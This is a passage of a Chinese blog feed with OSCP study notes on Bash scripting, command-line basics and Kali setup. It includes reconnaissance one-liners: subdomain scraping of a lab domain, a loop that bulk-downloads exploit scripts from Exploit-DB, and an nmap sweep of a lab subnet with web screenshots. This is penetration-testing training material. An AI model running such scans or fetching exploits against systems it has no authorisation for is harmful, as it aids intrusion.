Name</th><th>Description</th></tr></thead><tbody><tr><td>$0</td><td>Bash脚本名称</td></tr><tr><td>$1-$9</td><td>Bash脚本的前9个参数</td></tr><tr><td>$#</td><td>传递到Bash脚本参数个数</td></tr><tr><td>$@</td><td>传递给Bash脚本的所有参数</td></tr><tr><td>$?</td><td>显示最后命令的退出状态O表示没有错误，其他有错误</td></tr><tr><td>$$</td><td>当前进程的进程号PID</td></tr><tr><td>$USER</td><td>运行脚本的用户名</td></tr><tr><td>$HOSTNAME</td><td>主机的名称</td></tr><tr><td>$RANDOM</td><td>一个随机数</td></tr><tr><td>$LINENO</td><td>脚本中的当前行号</td></tr></tbody></table><h4 id="3-Read输入"><a href="#3-Read输入" class="headerlink" title="3. Read输入"></a>3. Read输入</h4><blockquote><p>捕获用户输入，并将其分配给一个变量</p></blockquote><table><thead><tr><th>参数名称</th><th>描述</th></tr></thead><tbody><tr><td>-p</td><td>用于给出提示符</td></tr><tr><td>-t</td><td>输入的时间限制，以秒为单位，没有输入直接退出</td></tr><tr><td>-n</td><td>输入的长度限制，最多接受多少个字符</td></tr><tr><td>-r</td><td>允许让输入中的内容包括：空格 / \ ？等特殊字符</td></tr></tbody></table><ul><li><p>例1</p><pre><code class="shell">read -p "Please input:" passecho -n "please input:"; read pass</code></pre></li><li><p>例2</p><pre><code class="shell">#!/bin/bashread -p 'username' usernameread -sp 'password' passwordecho 'Your creds are as follows:"$username"and"$password"'</code></pre></li></ul><h4 id="4-选择结构"><a href="#4-选择结构" class="headerlink" title="4. 选择结构"></a>4. 选择结构</h4><h5 id="1-一般语法结构"><a href="#1-一般语法结构" class="headerlink" title="1:) 一般语法结构"></a>1:) 一般语法结构</h5><pre><code class="shell">if [&lt;some test&gt;]then    &lt;perform and action&gt;fi</code></pre><ul><li>数值比较</li></ul><table><thead><tr><th>操作符</th><th>描述信息</th><th>例子</th></tr></thead><tbody><tr><td>-eq</td><td>等于则为真</td><td>[$a -eq $b]</td></tr><tr><td>-ne</td><td>不等于则为真</td><td>[$a -ne $b]</td></tr><tr><td>-gt</td><td>大于则为真</td><td>[$a -gt $b]</td></tr><tr><td>-ge</td><td>大于或小于则为真</td><td>[$a -ge $b]</td></tr><tr><td>-lt</td><td>小于则为真</td><td>[$a -lt $b]</td></tr><tr><td>-le</td><td>小于等于则为真</td><td>[$a -le $b]</td></tr></tbody></table><ul><li>字符串比较</li></ul><table><thead><tr><th>操作符</th><th>描述信息</th><th>例子</th></tr></thead><tbody><tr><td>==</td><td>相等则为真</td><td>[$a == $b]</td></tr><tr><td>!=</td><td>不相等则为真</td><td>[$a != $b]</td></tr><tr><td>-z 字符串</td><td>字符串长度为零为真</td><td>[-z $a]</td></tr><tr><td>-n 字符串</td><td>字符串长度不为空则为真</td><td>[-n $a]</td></tr><tr><td>str1 &gt; str2</td><td>str1大于str2为真</td><td>[str1 &gt; str2]</td></tr><tr><td>str1 &lt; str2</td><td>str1小于str2为真</td><td>[str1&lt; str2]</td></tr></tbody></table><blockquote><p>注：大于或小于字符串比较前面要加上反斜线</p></blockquote><ul><li>文件比较</li></ul><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>-e 文件名</td><td>如果文件或目录存在则为真</td></tr><tr><td>-r 文件名</td><td>如果文件存在且可读则为真</td></tr><tr><td>-w 文件名</td><td>如果文件存在且可写则为真</td></tr><tr><td>-x 文件名</td><td>如果文件存在且可执行则为真</td></tr><tr><td>-s 文件名</td><td>如果文件存在且至少有一个字符则为真</td></tr><tr><td>-d 文件名</td><td>如果文件存在且为目录则为真</td></tr><tr><td>-f 文件名</td><td>如果文件存在且为普通文件则为真</td></tr><tr><td>-c 文件名</td><td>如果文件存在且为字符型文件则为真</td></tr><tr><td>-b 文件名</td><td>如果文件存在且为块特殊文件则为真</td></tr><tr><td>file1 -nt file2</td><td>检查file1是否比file2新</td></tr><tr><td>file1 -ot file2</td><td>检查file1是否比file2旧</td></tr></tbody></table><p>案例<span class="github-emoji"><span>😆</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><pre><code class="shell">if [$age -lt 16];thenif test $age -lt 16</code></pre><blockquote><p><strong>注意</strong>：尽管两者功能相同，但是使用方括号可以使代码更易于阅读</p></blockquote><h5 id="2-双分支结构"><a href="#2-双分支结构" class="headerlink" title="2:)双分支结构"></a>2:)双分支结构</h5><pre><code class="shell">if [&lt;some test&gt;]then    &lt;perform action&gt;else    &lt;perform another action&gt;fi</code></pre><h5 id="3-多分支结构"><a href="#3-多分支结构" class="headerlink" title="3:)多分支结构"></a>3:)多分支结构</h5><pre><code class="shell">if [&lt;some test&gt;]          #一次判断then    &lt;perform action&gt;elif [&lt;some test&gt;]       #二次判断then    &lt;perform different action&gt;else                     #结束    &lt;perform yet another different action&gt;fi</code></pre><ul><li><p>布尔逻辑运算</p><table><thead><tr><th>操作符</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td>&amp;&amp;   /  And</td><td>只在前一个命令执行成功时执行命令</td><td>return True or 0</td></tr><tr><td>||   /   Or</td><td>只在上一个命令执行失败时，才会执行后面的命令</td><td>return False or non-zero</td></tr></tbody></table><ul><li><p>例1：</p><pre><code class="shell">user2=kaligrep $user2  /etc/passwd &amp;&amp; echo "$user2 found!" || echo "user2 not found!"</code></pre></li></ul></li></ul><h4 id="5-循环结构（loops）"><a href="#5-循环结构（loops）" class="headerlink" title="5. 循环结构（loops）"></a>5. 循环结构（loops）</h4><h5 id="1-for循环"><a href="#1-for循环" class="headerlink" title="1:)for循环"></a>1:)for循环</h5><pre><code class="shell">for var-name in &lt;list&gt;do    &lt;action to perform&gt;done</code></pre><ul><li><p>例1：快速打印IP地址</p><pre><code class="shell">for ip in `seq 1 9`; do echo "192.168.0.$ip";donefor i in {1..10}; do echo "10.1.1.$i";done</code></pre></li></ul><h5 id="2-while循环"><a href="#2-while循环" class="headerlink" title="2:)while循环"></a>2:)while循环</h5><pre><code class="shell">while [&lt;some test&gt;]do    &lt;perform an action&gt;done</code></pre><ul><li><p>例1：</p><pre><code class="shell">#!/bin/bashcounter=1      #-le小于等于则为真while [$counter -lt 10]do     echo "10.1.1.$counter"    ((counter++))done</code></pre></li></ul><h4 id="6-函数（Functions）"><a href="#6-函数（Functions）" class="headerlink" title="6. 函数（Functions）"></a>6. 函数（Functions）</h4><blockquote><p>我们可以将函数视为脚本中的脚本，当需要在脚本中执行多次同一代码时，就非常有用。<strong>编写函数然后根据需要调用函数</strong>通俗易懂的说：函数是一个子例程序或者一个实现一组操作的代码块</p></blockquote><pre><code class="shell">function function_name {    commands...}</code></pre><pre><code class="shell">function function_name(){    commands...}</code></pre><ul><li><p>例1：</p><pre><code class="shell">#!/bin/bashprintf_me () {    echo "The first Function"}printf_me</code></pre></li><li><p>例2：</p><pre><code class="shell">#!/bin/bashpass_arg() {    echo "Random is $1"}pass_arg $RANDOM</code></pre></li></ul><blockquote><p>除了向Bash函数传递参数之外，还可以从Bash函数返回值。Bash函数实际上不允许你返回传统意义上的任何值，可以从$?全局变量或者在函数内部设置一个全局变量/命令来模拟传统的返回</p></blockquote><pre><code class="shell">return_me(){    echo "Hello There,I'mreturning a random value!"    return $RANDOM    #返回生成的随机数}return_meecho "The previous function returned a value of $?"</code></pre><blockquote><p>全局变量：global关键字</p><p>局部变量：local关键字     local name=”Joe”</p></blockquote><p>local 一般用于局部变量声明，多用在函数内部使用</p><ul><li>shell脚本定义的变量是global的作用域，从被定义的地方开始到shell结束或被显示删除的地方位置</li><li>shell函数定义的变量默认是global的，其作用域从“函数被调用是执行变量定义的地方”开始，到shell结束或被显示删除处为止。函数定义的变量可以被显示定义成Local其作用域局限函数内，注意：函数的参数是Local的.</li><li>如果同名，shell函数定义的local变量会屏蔽脚本定义的global变量</li></ul><p><strong>例1</strong></p><pre><code class="shell">#!/bin/bashfunction Hello(){    local text="Hello World"   #局部变量    echo $text}Hello</code></pre><p><strong>总结</strong></p><ul><li>在没有声明同名局部变量的情况下更改函数内部变量的值将影响其全局值</li><li>更改与全局变量同名的局部变量不会影响其全局值</li></ul><h5 id="1-知识准备"><a href="#1-知识准备" class="headerlink" title="1:)知识准备"></a>1:)知识准备</h5><ul><li>wget</li><li>grep <ul><li>-v 不显示匹配到的行 （默认是显示匹配到的行）</li><li>-c 只输出匹配行的个数 grep -c “root” /etc/passwd</li><li>-i 不区分大小写</li><li>-L 输出包含匹配的字符文件名</li><li>-n 显示匹配的行号</li></ul></li><li>Cut 命令用于显示每行从头算起num1到num2的文字，如果不指定参数，Cut命令将读取标准输入<ul><li>-b 以字节为单位进行分割</li><li>-c 以字符为单位进行分割</li><li>-d自定义分隔符，默认为制表符</li><li>-f 指定显示哪个区域</li></ul></li><li>CutyCapt抓取网页的快照（网页截图）<ul><li>–url=<url> 要抓取页面的URL</url></li><li>–out=<path></path> 输出图片目标路径支持格式为（Png|Pdf|Ps|Svg|Jpeg）</li><li>–method=&lt;get|post|put&gt; 指定请求方式</li><li>–header=&lt;名称&gt; 请求头</li></ul></li></ul><h5 id="2-）找到megacorpone-com的子域并找到相对应的IP地址"><a href="#2-）找到megacorpone-com的子域并找到相对应的IP地址" class="headerlink" title="2:）找到megacorpone.com的子域并找到相对应的IP地址"></a>2:）找到megacorpone.com的子域并找到相对应的IP地址</h5><pre><code class="shell">1.wget www.megacorpone.com   #下载该网站的首页文件2.grep "href" index.html     #过滤超链接关键字3.grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpone\.com" | head#过滤"href="字段在index.html文件中，并将结果给到过滤出带.megacorpone的行在给到不显示带"www.megacorpone.com"的行，最后读取出来结果**通过这种逻辑的方式减少我们的数据，并在每次操作中按顺序进行较小的缩减，我们处于处理数据最常见的周期**awk -F设置多个字符的分隔符，与Cut不同，后者方式简单但只允许使用单字符分隔符4.grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpong\.com" | awk -F "http://" 'print $2' | cut -d "/" -f 15.grep -o '[^/]*\.megacorpone\.com' index.html | sort -u &gt; list.txt#grep -o 逐行输出匹配的内容，支持正则表达式6.for url in $(cat list.txt); do host $url; done7.for url in $(cat list.txt); do host $url; done | "has address" | cut -d " " -f 4 | sort -u</code></pre><h5 id="3-在exploit-db中下载漏洞利用脚本程序"><a href="#3-在exploit-db中下载漏洞利用脚本程序" class="headerlink" title="3:)在exploit-db中下载漏洞利用脚本程序"></a>3:)在exploit-db中下载漏洞利用脚本程序</h5><blockquote><p>Searchsploit 是一个针对ExploitDB的命令行搜索工具，他允许我们随时随地获取Exploit数据库的脱机副本</p></blockquote><ul><li>-w 返回<a href="https://www.exploit_db.com上的信息/">https://www.exploit_db.com上的信息</a></li><li>-t 搜索漏洞利用标题</li></ul><pre><code class="shell">1.searchsploit afd windows -w -t2.searchsploit afd windows -w -t | grep http | cut -f 2 -d "|"3.for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|"); do exp_name=$(echo $e | cut -d "/" -f 5) &amp;&amp; url = $(echo $e | sed 's/exploit/raw/') &amp;&amp; wget -q --no-check-certificate $url -O $exp_name;done4.#!/bin/bashfor e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|")do     exp_name=$(echo $e | cut -d "/" -f 5)    url=$(echo $e | sed 's/exploit/raw/')    wget -q --no-check-certificate $url -O $exp_namedone</code></pre><h5 id="4-嗅探网段开放80并抓取网页快照整理为HTML"><a href="#4-嗅探网段开放80并抓取网页快照整理为HTML" class="headerlink" title="4:)嗅探网段开放80并抓取网页快照整理为HTML"></a>4:)嗅探网段开放80并抓取网页快照整理为HTML</h5><pre><code class="shell">1.Nmap -A -p 80 --open 10.11.1.0/24 -oG nmap-scan_10.11.1.1-2542.Cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print$2}'3.for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print$2}');do cutycapt --url=$ip --out=$ip.png;done4.#!/bin/bashecho "&lt;html&gt;&lt;body&gt;&lt;br&gt;" &gt;web.htmlls -l *.png | awk -F : '{print $1":\n&lt;br&gt;&lt;img src=\""$1""$2"\" width=600&gt;&lt;br&gt;"}' &gt;&gt; web.htmlecho "&lt;/body&gt;&lt;/html&gt;" &gt;&gt;web.html</code></pre><h4 id="7-结语"><a href="#7-结语" class="headerlink" title="7.结语"></a>7.结语</h4><blockquote><p>Bash是一个功能强大的工作环境和脚本引擎，一个称职的安全专家熟练地利用Bash脚本来简化和自动化许多Linux任务和过程</p></blockquote><h5 id="1-Exercises-练习"><a href="#1-Exercises-练习" class="headerlink" title="1:)Exercises 练习"></a>1:)Exercises 练习</h5><ul><li>拍摄Kali虚拟机快照</li><li>搜索Kali中当前未安装的工具</li><li>安装工具</li><li>取下工具</li><li>将Kali虚拟机还原为以前拍摄的快照</li></ul><p><span class="github-emoji"><span>☯</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/262f.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>未完待续…</p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> 计算机认证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-命令行乐趣</title>
      <link href="2021/02/16/OSCP-%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B9%90%E8%B6%A3/"/>
      <url>2021/02/16/OSCP-%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B9%90%E8%B6%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Command-Line-Fun"><a href="#Command-Line-Fun" class="headerlink" title="Command Line Fun"></a>Command Line Fun</h1><h4 id="1-The-Bash-Enviroment"><a href="#1-The-Bash-Enviroment" class="headerlink" title="1. The Bash Enviroment"></a>1. The Bash Enviroment</h4><blockquote><p>Bash是一个与sh兼容的Shell;他允许我们从终端窗口运行复杂的命令和执行不同任务。结合了Korn Shell(Ksh)和C shell(csh)的特性。</p></blockquote><p><strong>这些变量是在终端会话期间运行的任何应用程序继承的各种设置的一种全局存储形式</strong></p><ul><li><p>$PATH最常被引用的环境变量之一是$PATH,它是一个冒号分隔的目录路径列表，每当没有完整路径的命令运行时候，Bash都会搜索这些路径</p><pre><code class="shell">┌──(laosec㉿kali)-[~]└─$ echo $PATH                                                              1 ⨯/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games┌──(laosec㉿kali)-[~]└─$ echo $USERlaosec                                                                         ┌──(laosec㉿kali)-[~]└─$ echo $HOME/home/laosec            </code></pre></li><li><p>可以通过export命令定义环境变量</p><pre><code class="shell">export b=10.11.1.220   #将b变量加入到环境变量中ping -c 2 $b           #$b变量值  $$是查看当前进程的PID</code></pre></li><li><p>通过命令<strong>env</strong>来查看环境变量</p><pre><code class="shell">──(laosec㉿kali)-[~]└─$ env               GJS_DEBUG_TOPICS=JS ERROR;JS LOGSSH_AUTH_SOCK=/run/user/1000/keyring/sshSESSION_MANAGER=local/kali:@/tmp/.ICE-unix/1185,unix/kali:/tmp/.ICE-unix/1185GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/e1988a97_fc6b_4732_b3ee_6a6bd85ff307SSH_AGENT_PID=1154XDG_CURRENT_DESKTOP=GNOMELANG=zh_CN.UTF-8LANGUAGE=zh_CN:zhPWD=/home/laosecQT_IM_MODULE=ibusGPG_AGENT_INFO=/run/user/1000/gnupg/S.gpg-agent:0:1USER=laosecGJS_DEBUG_OUTPUT=stderrXDG_MENU_PREFIX=gnome-DESKTOP_SESSION=gnomeHOME=/home/laosecDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/busGTK_MODULES=gail:atk-bridgeXDG_DATA_DIRS=/usr/share/gnome:/usr/local/share/:/usr/share/WINDOWPATH=2XDG_SESSION_DESKTOP=gnomeQT_ACCESSIBILITY=1GNOME_DESKTOP_SESSION_ID=this-is-deprecatedVTE_VERSION=6201QT_AUTO_SCREEN_SCALE_FACTOR=0LOGNAME=laosecGNOME_TERMINAL_SERVICE=:1.73PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/gamesXDG_RUNTIME_DIR=/run/user/1000XMODIFIERS=@im=ibusSHELL=/usr/bin/zshXDG_SESSION_TYPE=x11POWERSHELL_TELEMETRY_OPTOUT=1_JAVA_OPTIONS=-Dawt.useSystemAAFontSettings=on -Dswing.aatext=trueUSERNAME=laosecGDM_LANG=zh_CN.UTF-8QT_QPA_PLATFORMTHEME=qt5ctXAUTHORITY=/run/user/1000/gdm/XauthorityCOLORTERM=truecolorXDG_SESSION_CLASS=userTERM=xterm-256colorGDMSESSION=gnomeDISPLAY=:1SHLVL=1OLDPWD=/home/laosec </code></pre></li></ul><h4 id="2-TAB-Completion"><a href="#2-TAB-Completion" class="headerlink" title="2. TAB Completion"></a>2. TAB Completion</h4><blockquote><p>制表符–&gt; TAB键–&gt;命令补齐</p></blockquote><h4 id="3-BASH-History-Tricks"><a href="#3-BASH-History-Tricks" class="headerlink" title="3. BASH History Tricks"></a>3. BASH History Tricks</h4><pre><code class="shell">history #查看历史命令！1     #执行历史命令的第一条命令！！    #执行上一条命令</code></pre><blockquote><p>命令历史记录保存在用户的家目录.bash_history</p><p>HISTSIZE:控制当前会话内存中存储的命令数</p><p>HISFILESIZE:配置历史文件中保存的命令数</p></blockquote><h4 id="4-Piping-and-Redirection"><a href="#4-Piping-and-Redirection" class="headerlink" title="4. Piping and Redirection"></a>4. Piping and Redirection</h4><blockquote><p>管道和重定向,管道即作为一个命令的输出作为另一个命令的输入</p></blockquote><p><strong>从命令行运行的每个程序都有三个数据流连接到它，作为与外部环境的通信信道</strong></p><table><thead><tr><th>标准文件</th><th>文件作用</th><th>文件描述符</th></tr></thead><tbody><tr><td>Stdin</td><td>标准输入</td><td>0</td></tr><tr><td>Stdout</td><td>标准输出</td><td>1</td></tr><tr><td>Stderr</td><td>标准错误输出</td><td>2</td></tr></tbody></table><pre><code class="shell">&gt; 输出重定向&gt;&gt; 输出追加重定向&lt; 输入重定向| 管道符</code></pre><ul><li><p>wc命令计算字数</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-c –byte或–chars</td><td>只显示Byte数 UTF-8编码</td></tr><tr><td>-l 或 –line</td><td>只显示行数</td></tr><tr><td>-w 或 –words</td><td>只显示字数</td></tr><tr><td>-m</td><td>对文件中的字符计数 ASCII字符占用字节</td></tr></tbody></table></li><li><p>Exerices</p><ol><li>使用Cat与sort命令对/etc/passwd进行排序</li><li>练习输出重定向</li></ol></li></ul><h4 id="5-grep-sed-cut-awk"><a href="#5-grep-sed-cut-awk" class="headerlink" title="5. grep/sed/cut/awk"></a>5. grep/sed/cut/awk</h4><blockquote><p>正则表达式（regex）用于描述搜索模式的特殊文本字符串</p></blockquote><ul><li><p>grep:搜索文件中匹配的字符串</p></li><li><p>sed:利用脚本来处理文本文件</p></li><li><p>cut:查看显示行中指定部分 -d:指定字段分隔符  -f:要切割的字段号</p><pre><code class="shell">┌──(laosec㉿kali)-[~]└─$ cut -d ":" -f 1 /etc/passwdrootdaemonbinsyssync</code></pre></li><li><p>awk:数据提取和报告工具 -F:字段分隔符  print:输出结果文本</p><pre><code class="shell">┌──(laosec㉿kali)-[~]└─$ echo "hello::there::firend" | awk -F "::" '{print $1,$3}'hello firend</code></pre></li><li><p>uniq/sort</p></li></ul><h4 id="6-Editing-Files-From-The-Command-Line"><a href="#6-Editing-Files-From-The-Command-Line" class="headerlink" title="6. Editing Files From The Command Line"></a>6. Editing Files From The Command Line</h4><ul><li>图形界面：gedit/leafpad</li><li>命令行界面：vi/vim/nano</li></ul><h4 id="7-Comparing-Files"><a href="#7-Comparing-Files" class="headerlink" title="7. Comparing Files"></a>7. Comparing Files</h4><ul><li>comm</li><li>diff</li><li>vimdiff</li></ul><h4 id="8-Managing-Processes"><a href="#8-Managing-Processes" class="headerlink" title="8. Managing  Processes"></a>8. Managing  Processes</h4><pre><code class="shell">ping baidu.com &gt; 1.txt &amp; Ctrl + zbg # 显示后台运行程序fg #调入前台ps #查看进程kill -9 #杀死进程</code></pre><h4 id="9-File-and-Command-Monitoring"><a href="#9-File-and-Command-Monitoring" class="headerlink" title="9. File and Command Monitoring"></a>9. File and Command Monitoring</h4><ul><li>tail：监视正在写入的日志文件条目</li><li>watch：定期运行指定的命令</li></ul><h4 id="10-Downloading-Files"><a href="#10-Downloading-Files" class="headerlink" title="10. Downloading Files"></a>10. Downloading Files</h4><ul><li>wget</li><li>curl</li><li>axel</li></ul><h4 id="11-Customizing-the-Bash-Enviroment"><a href="#11-Customizing-the-Bash-Enviroment" class="headerlink" title="11. Customizing the Bash Enviroment"></a>11. Customizing the Bash Enviroment</h4><pre><code class="shell">exportexport HISTTIMEFORMAT='%F %T'  #添加时间显示history</code></pre><h4 id="12-Alias-Unalias"><a href="#12-Alias-Unalias" class="headerlink" title="12. Alias/Unalias"></a>12. Alias/Unalias</h4><pre><code class="shell">alias lsa='ls -la'   #创建别名lsalsa                  #应用别名alias mkdir='ping -c 1 localhost'   #创建别名mkdirmkdir                #应用别名unalias mkdir        #删除别名mkdir                #再次测试</code></pre><ul><li>未完待续…</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机认证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-适应Kali</title>
      <link href="2021/02/16/OSCP-%E9%80%82%E5%BA%94Kali/"/>
      <url>2021/02/16/OSCP-%E9%80%82%E5%BA%94Kali/</url>
      
        <content type="html"><![CDATA[<h1 id="Getting-Comfortable-With-Kali"><a href="#Getting-Comfortable-With-Kali" class="headerlink" title="Getting Comfortable With Kali"></a>Getting Comfortable With Kali</h1><blockquote><p>Kali Linux是由Offensive Security开发，资助和维护的。它是基于Debian的Linux发行版，旨在进行高级的渗透测试和安全审计，Kali中包含数百个工具，用于各种信息安全任务，如渗透测试/安全研究/计算机取证和逆向工程。</p></blockquote><ul><li>网络渗透测试：<strong>Metasploit</strong></li><li>端口和漏洞扫描：<strong>Nmap</strong></li><li>监视网络流量：<strong>Wirshark</strong></li><li>无线网络安全性：<strong>Aircrack-ng</strong></li></ul><blockquote><p><strong>亚伯拉罕.林肯：给我6个小时砍倒一棵树，我将用前四个小时来磨斧头</strong></p></blockquote><h4 id="1-细节："><a href="#1-细节：" class="headerlink" title="1. 细节："></a>1. 细节：</h4><ol><li>虚拟机复制与移动的区别：复制会指示虚拟机生成新的虚拟MAC地址.移动则不会</li><li>默认用户密码：Username:kali Password：kali</li><li>首次使用更改密码：Kali默认用户：root/kali</li><li>提升权限命令：<strong>sudo</strong></li></ol><pre><code class="shell">┌──(chong㉿kali)-[~]└─$ whoamichong                                                                             ┌──(chong㉿kali)-[~]└─$ sudo whoami     [sudo] chong 的密码：root</code></pre><h4 id="2-Exercises"><a href="#2-Exercises" class="headerlink" title="2. Exercises"></a>2. Exercises</h4><ul><li>更改虚拟机默认密码</li><li>熟悉Kali菜单</li><li>使用工具站点</li></ul><h4 id="1-文件系统"><a href="#1-文件系统" class="headerlink" title="1. 文件系统"></a>1. 文件系统</h4><blockquote><p>Kali Linux遵循文件系统层次结构标准（FHS:Filesystem Hierarchy Standard）</p></blockquote><table><thead><tr><th>目录位置</th><th>目录含义</th></tr></thead><tbody><tr><td>/bin</td><td>基本程序（ls/cd/cat…）</td></tr><tr><td>/sbin</td><td>系统程序（fdisk/mkfs/sysctl….）</td></tr><tr><td>/etc</td><td>配置文件（resolv.conf）</td></tr><tr><td>/tmp</td><td>临时文件（通常在启动时删除）</td></tr><tr><td>/usr/bin</td><td>应用程序（apt/ncat/nmap…）</td></tr><tr><td>/usr/share</td><td>应用程序支持和数据文件…</td></tr></tbody></table><h4 id="2-Basic-Linux-Commands"><a href="#2-Basic-Linux-Commands" class="headerlink" title="2. Basic Linux Commands"></a>2. Basic Linux Commands</h4><ul><li><p>man命令  –手册章节目录</p><table><thead><tr><th>编号</th><th>含义</th><th>英文表示</th></tr></thead><tbody><tr><td>1</td><td>用户命令</td><td>User Commands</td></tr><tr><td>2</td><td>内核系统的编程接口调用</td><td>Programing interface for kernel system calls</td></tr><tr><td>3</td><td>C库编程接口</td><td>Programing interface to the C library</td></tr><tr><td>4</td><td>特殊文件，如果设备节点和驱动程序</td><td>Special file such as drive nodes and drivers</td></tr><tr><td>5</td><td>文件格式</td><td>File formats</td></tr><tr><td>6</td><td>游戏和娱乐如屏幕保护程序</td><td>Games and amusements such as screen savers</td></tr><tr><td>7</td><td>杂项</td><td>Micellaneous</td></tr><tr><td>8</td><td>系统管理命令</td><td>System administration commands</td></tr></tbody></table><ul><li><p>例：</p><p>/etc/passwd –&gt; man passwd</p><p>-k关键字搜索  man -k ‘^passwd$’</p></li><li><p>man 5 passwd  –&gt; 查找给定命令的文档</p></li></ul></li><li><p>apropos </p><blockquote><p>用来通过关键字查找定位手册页的名字和描述，功能与man -k相同</p><p>查找硬盘分区命令：apropos partition</p></blockquote></li><li><p>Listing Files </p><pre><code class="shell">ls -al #显示所有文件，并在一行显示一个文件名</code></pre></li><li><p>Cd/pwd</p><pre><code class="shell">cd ~ ：会到家目录 cd - ：回到来到此目录的上一级</code></pre></li><li><p>mkdir/rm</p><pre><code class="shell">mkdir "module one" --&gt;cd module\ one/mkdir -p #递归创建文件夹mkdir -p test/{recon,exploit,report}   #在test文件夹下创建三个文件夹</code></pre></li><li><p>find/locate/which</p><blockquote><p>which命令在$PATH环境变量中定义的目录中搜索给定的文件名，这个变量包含一个目录列表，当没有路径的命令发出时，Kali会搜索这些目录。如果找到匹配项，则返回文件的完整路径.</p><pre><code class="shell">which sudo   --&gt; echo $PATH</code></pre></blockquote><blockquote><p>locate命令是查找Kali中文件和目录位置最快的方法，为了提供更短的搜索时间，Locate搜索一个名为locate.db而不是整个硬盘本身.这个数据库有Cron调度程序定期自动更新，手动更新数据库：<strong>updatedb</strong></p></blockquote><blockquote><pre><code class="shell">find / -name sbd* </code></pre><p>与locate相比，find主要有点是可以通过不只是名称来搜索文件和目录，可以按照文件年龄/大小/所有者/文件类型/时间戳/权限来进行搜索</p></blockquote></li></ul><h4 id="3-SSH-Service"><a href="#3-SSH-Service" class="headerlink" title="3. SSH Service"></a>3. SSH Service</h4><pre><code class="shell">systemctl start ssh    #启动SSH服务ss -anptl | grep sshd  #验证是否开启SSH服务systemctl enable ssh   #将SSH服务加入到系统自动启动</code></pre><h4 id="4-SS命令"><a href="#4-SS命令" class="headerlink" title="4. SS命令"></a>4. SS命令</h4><blockquote><p>SS是Socket Statistics 的缩写。SS命令可以用来获取Socket统计信息，可以显示和netstat类似的内容。SS的优势在于他能够显示更多的详细的相关的Tcp和连接状态信息，而且比netstat更快速，更高效。</p></blockquote><p><strong>当服务器的Socket连接数量变得非常大时，无论使用netstat还是直接cat /proc/net/tcp都很慢，SS快就在于利用了Tcp协议栈中Tcp_diag,Tcp_diag是一个用于分析统计的模块，可以获取Linux内核中一手信息</strong></p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>-t</td><td>tcp</td></tr><tr><td>-u</td><td>udp</td></tr><tr><td>-a</td><td>all</td></tr><tr><td>-l</td><td>Listening 列出所有打开的网络连接端口</td></tr><tr><td>-s</td><td>Summary 显示Sockets摘要</td></tr><tr><td>-p</td><td>Progress</td></tr><tr><td>-n</td><td>numeric 不解析服务名称</td></tr><tr><td>-r</td><td>resolve 解析服务名称</td></tr><tr><td>-m</td><td>memory 显示内存情况</td></tr></tbody></table><pre><code class="shell">ss -pl           #查看进程使用Socketss -u -a         #显示所有UDP Socketss dst 127.0.0.1 #匹配远程地址ss src 127.0.0.1 #匹配本地地址和端口号</code></pre><h4 id="5-HTTP-Service"><a href="#5-HTTP-Service" class="headerlink" title="5. HTTP Service"></a>5. HTTP Service</h4><pre><code class="shell">systemctl start apache2  #启动Apache服务ss -antlp | grep apache  #检测服务是否启动systemctl enable apache2 #开机自启动Apachesystemctl list-unit-files | grep xxx #查看是否加入开机启动项</code></pre><h4 id="6-APT"><a href="#6-APT" class="headerlink" title="6. APT"></a>6. APT</h4><blockquote><p>APT工具，帮助在基于Debian的系统上管理包或应用程序</p></blockquote><pre><code class="shell">apt update #更新可用软件列表：版本 描述有关信息apt upgrade #将已安装的包和核心系统升级到最新版本apt upgrade metasploit-framework  #升级单个包MSFapt -cache search pure-ftpd#显示存储在内部缓存包数据库中的许多信息，查找Kali存储库中是否存在该应用程序#在包中的描述中查找请求的关键字，而不是包名本身apt show &lt;package_name&gt;     #查看包文件的详细信息apt install &lt;package_name&gt;  #安装程序包，可用于通过apt install后跟包名称添加到系统中apt remove --purge           #命令删除Kali中的包，使用apt remove删除一个包会删除所有包数据，但通常情况下会留一些小的（修改过的用户配置文件，以防意外删除，添加--purge选项将删除所有剩余选项）</code></pre><h4 id="7-Dpkg"><a href="#7-Dpkg" class="headerlink" title="7. Dpkg"></a>7. Dpkg</h4><blockquote><p>dpkg工具是用于直接或间接通过ATP安装软件包的核心工具，也是离线操作时的首选工具，因为不需要互联网连接.注：<strong>dpkg不会安装包可能需要的任何依赖项</strong></p></blockquote><pre><code class="shell">dpkg -i or --install &lt;packet_name&gt;.debapt autoremove       #自动移除.packageapt list --upgrade   #展示可升级表单apt list --install   #展示已安装表单apt list --all -versions #展示系统中所有能找到的Package</code></pre><h4 id="8-APT与APT-GET的区别"><a href="#8-APT与APT-GET的区别" class="headerlink" title="8. APT与APT-GET的区别"></a>8. APT与APT-GET的区别</h4><ul><li>未完待续…</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机认证 </category>
          
      </categories>
      
      
    </entry>
